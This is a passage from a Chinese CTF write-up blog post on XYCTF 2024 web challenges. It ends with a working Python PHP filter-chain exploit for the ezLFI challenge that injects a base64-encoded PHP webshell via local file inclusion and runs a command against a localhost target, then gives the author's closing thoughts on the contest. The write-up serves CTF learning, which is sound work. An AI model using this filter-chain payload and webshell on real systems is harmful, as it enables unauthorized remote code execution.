+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#参数file</span><br><span class="line">url = &quot;http://localhost:51650/index.php&quot;</span><br><span class="line">file_to_use = &quot;/etc/passwd&quot;</span><br><span class="line">command = &quot;/readflag&quot; #正常做题的话应该先是ls根目录发现有readflag文件并且flag无法直接通过cat读取，再用/readflag</span><br><span class="line"></span><br><span class="line">#&lt;?=`$_GET[0]`;;?&gt;</span><br><span class="line">base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    &#x27;R&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class="line">    &#x27;B&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class="line">    &#x27;C&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class="line">    &#x27;8&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27;: &#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;,</span><br><span class="line">    &#x27;s&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class="line">    &#x27;z&#x27;: &#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;,</span><br><span class="line">    &#x27;U&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class="line">    &#x27;P&#x27;: &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;,</span><br><span class="line">    &#x27;V&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class="line">    &#x27;0&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class="line">    &#x27;Y&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27;: &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;,</span><br><span class="line">    &#x27;d&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class="line">    &#x27;D&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class="line">    &#x27;7&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class="line">    &#x27;4&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># generate some garbage base64</span><br><span class="line">filters = &quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br><span class="line">filters += &quot;convert.base64-encode|&quot;</span><br><span class="line"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="line">filters += &quot;convert.iconv.UTF8.UTF7|&quot;</span><br><span class="line"></span><br><span class="line">for c in base64_payload[::-1]:</span><br><span class="line">        filters += conversions[c] + &quot;|&quot;</span><br><span class="line">        # decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br><span class="line">        filters += &quot;convert.base64-decode|&quot;</span><br><span class="line">        filters += &quot;convert.base64-encode|&quot;</span><br><span class="line">        # get rid of equal signs</span><br><span class="line">        filters += &quot;convert.iconv.UTF8.UTF7|&quot;</span><br><span class="line"></span><br><span class="line">filters += &quot;convert.base64-decode&quot;</span><br><span class="line"></span><br><span class="line">final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;</span><br><span class="line">print(final_payload)</span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    &quot;0&quot;: command,</span><br><span class="line">    #&quot;action&quot;: &quot;include&quot;,</span><br><span class="line">    &quot;file&quot;: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>总结：这题只要听过知识点就是送，没听过就是折磨，感觉应该给新生多点引导吧</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整体题目还是比较简单的，只是这次比赛时间恰好跟我期中考试时间撞上了有点可惜</p>
+<p>misc和reverse没做出来几道这里就不出来献丑了</p>
+<p>总的来说是一次对小白比较友好地ctf比赛吧，毕竟大部分题目都直接是代码跳杀，确实学到了不少东西</p>
+<p>唯一的问题是php太多了，希望下次多加点关于别的语言的内容（后来看了一下baby_unserialize好像是沟槽的Java反序列化，但还是有点少了）</p>
+<p>还有一个很奇妙的现象是：ezclass的难度比牢大要简单多了，但是解出少了一半，盲猜是因为比赛的时候网上挂wp的没做出来（））</p>
+<p>哦对闲鱼还有卖flag的哈哈哈哈哈哈，真的差不多得了，web就解出来六道还都是巨简单的题目也好意思卖也是绝</p>
+<p>HAPPY XYCTF2024!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#warm-up"><span class="toc-number">1.1.</span> <span class="toc-text">warm up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezmake"><span class="toc-number">1.2.</span> <span class="toc-text">ezmake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-make"><span class="toc-number">1.3.</span> <span class="toc-text">ez?make</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezmd5"><span class="toc-number">1.4.</span> <span class="toc-text">ezmd5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-number">1.5.</span> <span class="toc-text">我是一个复读机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezhttp"><span class="toc-number">1.6.</span> <span class="toc-text">ezhttp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop"><span class="toc-number">1.7.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezclass"><span class="toc-number">1.8.</span> <span class="toc-text">ezclass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezRCE"><span class="toc-number">1.9.</span> <span class="toc-text">ezRCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezSerialize"><span class="toc-number">1.10.</span> <span class="toc-text">ezSerialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7"><span class="toc-number">1.11.</span> <span class="toc-text">牢牢记住，逝者为大</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezLFI-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.12.</span> <span class="toc-text">ezLFI(赛后复现)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&text=XYCTF 2024 web week1 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&is_video=false&description=XYCTF 2024 web week1 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XYCTF 2024 web week1 wp&body=Check out this article: https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&name=XYCTF 2024 web week1 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&t=XYCTF 2024 web week1 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
